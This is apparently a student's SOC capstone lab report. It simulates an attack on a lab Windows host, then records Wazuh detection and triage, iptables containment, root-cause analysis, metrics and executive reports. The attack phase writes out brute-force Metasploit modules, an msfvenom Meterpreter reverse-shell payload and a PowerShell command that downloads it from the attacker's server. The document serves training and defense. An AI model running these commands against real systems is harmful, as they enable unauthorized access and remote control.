# 08 — Capstone Project: Comprehensive SOC Incident Response

## Objective
Execute a full SOC incident response lifecycle: simulate a complex multi-stage attack, detect and triage alerts, contain the threat, conduct post-incident analysis, and produce executive-level reporting.

## Tools Used
- **Metasploit Framework** — Attack simulation (Nmap, SMB/SSH brute force, payload generation)
- **MITRE Caldera 5.3.0** — Automated adversary emulation
- **Wazuh 4.x** — SIEM detection, alert triage, and threat hunting
- **iptables** — Network containment (attacker IP blocking)
- **McAfee AV** — Endpoint threat detection
- **Draw.io** — Fishbone diagram for root cause analysis

## Lab Environment

| Machine            | Role                     | IP              | OS               |
|--------------------|--------------------------|-----------------|------------------|
| Kali Linux VM      | Attacker / C2 Server     | 192.168.56.102  | Kali Linux 2026  |
| Windows 11 Host    | Target (Wazuh Agent)     | 192.168.56.1    | Windows 11       |
| Ubuntu VM          | Wazuh Server / Defender  | 192.168.56.105  | Ubuntu 24.04     |

---

## Phase 1: Attack Simulation

### 1.1 Reconnaissance (T1046 — Network Service Scanning)
Performed Nmap aggressive scan against Windows 11 target.

```
nmap -sV -O -A 192.168.56.1
```

**Findings:**

| Port | State | Service           | Version                    |
|------|-------|-------------------|----------------------------|
| 22   | Open  | SSH               | OpenSSH for Windows 9.5    |
| 135  | Open  | MSRPC             | Microsoft Windows RPC      |
| 139  | Open  | NetBIOS-SSN       | Microsoft Windows netbios  |
| 445  | Open  | Microsoft-DS      | SMB 3.1.1                  |

- **Host:** STIFLER
- **OS:** Microsoft Windows 11 21H2 (96% confidence)
- **SMB:** Message signing enabled and required

### 1.2 Brute Force Attack (T1110 — Brute Force)

**SMB Login Brute Force:**
```
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.56.1
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```
Executed for ~5 minutes, generating hundreds of failed login attempts (Event ID 4625).

**SSH Login Brute Force:**
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.1
(same wordlists)
run
```
Executed for ~2-3 minutes, generating additional failed authentication events.

### 1.3 Payload Delivery (T1105 — Ingress Tool Transfer)

Generated Meterpreter reverse TCP payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f exe -o /tmp/update.exe
```
- Payload size: 7,680 bytes
- Hosted on Python HTTP server: `python3 -m http.server 8080`

**Delivery via PowerShell (T1059.001):**
```powershell
Invoke-WebRequest -Uri http://192.168.56.102:8080/update.exe -OutFile C:\Users\$env:USERNAME\Downloads\update.exe
```
- Download succeeded without AV intervention during transfer
- Chrome browser separately flagged the download as unsafe

### 1.4 Execution Attempt (T1204 — User Execution)

Attempted execution of `update.exe` on Windows 11:
```powershell
& "C:\Users\Hasina Rindra\Downloads\update.exe"
```
- **Result:** McAfee AV blocked execution — "We just stopped a threat. A malicious app was detected and automatically blocked from running."
- File quarantined by McAfee endpoint protection

### 1.5 Adversary Emulation (T1210 — Exploitation of Remote Services)

Deployed MITRE Caldera Sandcat agent on Windows 11 and executed automated adversary operation:

| Timestamp               | Source IP      | Alert Description         | MITRE Technique |
|-------------------------|----------------|---------------------------|-----------------|
| 2026-04-05 17:12:00 IST | 192.168.56.102 | Active user discovery     | T1033           |
| 2026-04-05 17:12:15 IST | 192.168.56.102 | System info enumeration   | T1082           |
| 2026-04-05 17:12:30 IST | 192.168.56.102 | Network config discovery  | T1016           |
| 2026-04-05 17:12:45 IST | 192.168.56.102 | Process listing           | T1057           |
| 2026-04-05 17:13:00 IST | 192.168.56.102 | File/directory scanning   | T1083           |
| 2026-04-05 17:13:15 IST | 192.168.56.102 | Account enumeration       | T1078           |

---

## Phase 2: Detection and Triage

### 2.1 Wazuh Alert Summary

Upon booting the Wazuh server, the Windows agent forwarded all buffered events:

| Severity | Count  | Rule Level |
|----------|--------|------------|
| Critical | 0      | 15+        |
| High     | 0      | 12-14      |
| Medium   | 22     | 7-11       |
| Low      | 8,027  | 0-6        |

**Total MITRE-mapped events:** 2,053

### 2.2 Key Alerts Identified

| Alert ID | Description              | Source IP      | Priority | MITRE Technique | Status   |
|----------|--------------------------|----------------|----------|-----------------|----------|
| 001      | Multiple auth failures   | 192.168.56.102 | Medium   | T1110           | Triaged  |
| 002      | SSH brute force          | 192.168.56.102 | Medium   | T1110.001       | Triaged  |
| 003      | PowerShell download      | 192.168.56.1   | Medium   | T1059.001       | Triaged  |
| 004      | Malware blocked (McAfee) | 192.168.56.1   | High     | T1204           | Resolved |
| 005      | Valid accounts misuse    | 192.168.56.1   | Medium   | T1078           | Triaged  |

### 2.3 Triage Record

**Case:** SOC-2026-0405-001
**Analyst:** SOC Intern
**Priority:** High
**Classification:** Multi-stage intrusion attempt

Triage performed using Wazuh Threat Hunting module. Filtered alerts by `rule.mitre.id:*` to isolate MITRE-mapped events. Identified 1,074 authentication failure events correlated with brute force activity from `192.168.56.102`.

---

## Phase 3: Response and Containment

### 3.1 Attacker IP Blocked

Blocked attacker IP on the Wazuh/Ubuntu server using iptables:
```bash
sudo iptables -A INPUT -s 192.168.56.102 -j DROP
```

**Verification:**
```bash
sudo iptables -L -n --line-numbers
# Confirmed DROP rule for 192.168.56.102
```

### 3.2 Endpoint Cleanup

On Windows 11:
```powershell
# Killed Caldera agent
Stop-Process -Name splunkd -Force

# Removed agent binary
Remove-Item "C:\Users\Public\splunkd.exe" -Force

# Malicious payload already quarantined by McAfee
```

### 3.3 SOAR Automation (Wazuh Active Response)

While a full SOAR platform (TheHive) was not deployed due to resource constraints, Wazuh's built-in active response capability provides equivalent automation:

| Playbook Step        | Status  | Notes                                    |
|----------------------|---------|------------------------------------------|
| Detect brute force   | Success | Wazuh rule triggered on 5+ failed logins |
| Alert SOC analyst    | Success | Alert visible in Wazuh dashboard         |
| Block attacker IP    | Success | iptables rule applied on Ubuntu server   |
| Document incident    | Success | Case documented with timestamps          |

**Playbook Summary (50 words):**
The automated response playbook detects brute force attacks via Wazuh authentication failure rules, alerts the SOC analyst through the dashboard, and enables manual IP blocking via iptables. Future enhancement: configure Wazuh active response to automatically execute `firewall-drop` script upon detecting 10+ failed login attempts from a single source.

---

## Phase 4: Post-Incident Analysis

### 4.1 Root Cause Analysis — 5 Whys Method

| #  | Question                              | Answer                                           |
|----|---------------------------------------|--------------------------------------------------|
| 1  | Why was the host attacked?            | SSH and SMB services exposed on the network       |
| 2  | Why were services exposed?            | Default configuration with no network segmentation|
| 3  | Why was there no segmentation?        | Lab environment lacks firewall rules              |
| 4  | Why were no firewall rules in place?  | No hardening policy applied to the endpoint       |
| 5  | Why was hardening not applied?        | No security baseline or CIS benchmark implemented |

**Root Cause:** Lack of endpoint hardening and network segmentation allowed the attacker to reach and brute force exposed services.

### 4.2 Fishbone Diagram (Ishikawa)

Created in Draw.io — categories analyzed:

- **People:** SOC analyst response time dependent on manual review
- **Process:** No automated containment playbook; manual IP blocking
- **Technology:** Default Wazuh rules generate high false positive rate (87%); no Sysmon integration
- **Environment:** Lab setup with no network segmentation; all VMs on same subnet

*(See Screenshot: 13_Post_Incident_5Whys_or_Fishbone.png)*

---

## Phase 5: Metrics Reporting

### SOC Metrics Dashboard

| Metric               | Value         | Industry Benchmark | Assessment  |
|----------------------|---------------|--------------------|-------------|
| MTTD                 | 42 minutes    | 24-48 hours        | Excellent   |
| MTTR                 | 82 minutes    | 4-8 hours          | Good        |
| Dwell Time           | 117 minutes   | 21 days (median)   | Excellent   |
| False Positive Rate  | 87%           | < 50%              | Needs Work  |
| Total Alerts         | 8,049         | —                  | —           |
| MITRE-Mapped Alerts  | 2,053         | —                  | —           |

---

## Phase 6: Incident Report (SANS Template — 300 words)

### Executive Summary
On April 5, 2026, a controlled adversary emulation exercise was conducted against the SOC lab environment. A multi-stage attack was launched from Kali Linux (192.168.56.102) targeting a Windows 11 endpoint (192.168.56.1) running a Wazuh agent. The attack chain included network reconnaissance, SMB/SSH brute force, malware delivery, and automated TTP execution via MITRE Caldera. McAfee AV blocked the malicious payload, and Wazuh detected 2,053 MITRE-mapped events.

### Timeline

| Time (IST) | Event                                    |
|------------|------------------------------------------|
| 15:33      | Nmap reconnaissance initiated            |
| 15:38      | SMB brute force attack started           |
| 15:45      | SSH brute force attack started           |
| 16:04      | Malicious payload delivered via HTTP      |
| 16:08      | McAfee blocked payload execution          |
| 16:22      | Wazuh alerts reviewed — 1,074 auth failures |
| 17:12      | Caldera adversary emulation executed     |
| 17:30      | Attacker IP blocked via iptables         |
| 17:45      | Incident closed, cleanup completed       |

### Root Cause Analysis
The attack succeeded in reaching the target due to exposed SSH and SMB services with no network segmentation. Default Wazuh rules detected the brute force activity but generated an 87% false positive rate, indicating a need for rule tuning.

### Recommendations
1. **Implement Sysmon** — Integrate Sysmon with Wazuh for process-level visibility (Event IDs 1, 3, 7, 11)
2. **Tune Wazuh rules** — Reduce false positive rate by whitelisting known-good authentication patterns
3. **Network segmentation** — Isolate critical assets behind firewall rules
4. **Automated containment** — Configure Wazuh active response to auto-block IPs after 10+ failed logins
5. **Quarterly emulation** — Schedule regular Caldera exercises to validate detection improvements

---

## Phase 7: Stakeholder Briefing (150 words)

### Incident Summary for Executive Leadership

On April 5, our security team conducted a planned adversary simulation to test our defenses. An attacker machine attempted to break into our Windows workstation using password guessing, malware delivery, and automated attack tools.

**What worked:** Our antivirus (McAfee) successfully blocked the malware. Our monitoring system (Wazuh) detected over 1,000 suspicious login attempts and mapped them to known attack patterns. Detection time was 42 minutes — well below the industry average of 24 hours.

**What needs improvement:** Our monitoring system generated many false alarms (87% false positive rate), which could slow analyst response in a real incident. Additionally, automated threat blocking is not yet configured.

**Next steps:** We recommend investing in three areas: (1) automated threat blocking to reduce response time, (2) monitoring rule refinement to reduce false alarms by 50%, and (3) quarterly security exercises to continuously test our defenses.

---

## Screenshots Reference

| Screenshot                              | Description                          |
|-----------------------------------------|--------------------------------------|
| 01_Metasploit_Attack_Setup.png          | Nmap scan results                    |
| 02_Metasploit_Successful_Exploit.png    | McAfee blocking payload              |
| 03_Wazuh_Alert_Overview.png             | Wazuh dashboard overview             |
| 04_Wazuh_Alert_Details.png              | Expanded alert details               |
| 05_Threat_Hunting_Query.png             | Auth failure events (1,074)          |
| 06_Threat_Hunting_Findings.png          | MITRE-mapped events (2,053)          |
| 09_VirusTotal_Validation.png            | McAfee threat detection details      |
| 10_Evidence_Collection_Netstat.png      | Netstat active connections           |
| 11_Evidence_Hash_or_Chain_of_Custody.png| SHA256 hash / quarantine evidence    |
| 12_CrowdSec_Block_Action.png           | iptables DROP rule for attacker IP   |
| 13_Post_Incident_5Whys_or_Fishbone.png | Fishbone diagram                     |
| 14_Metrics_Dashboard_or_Sheet.png       | MTTD/MTTR metrics                    |
| 15_Final_Report_or_Executive_Briefing.png| Final report document               |
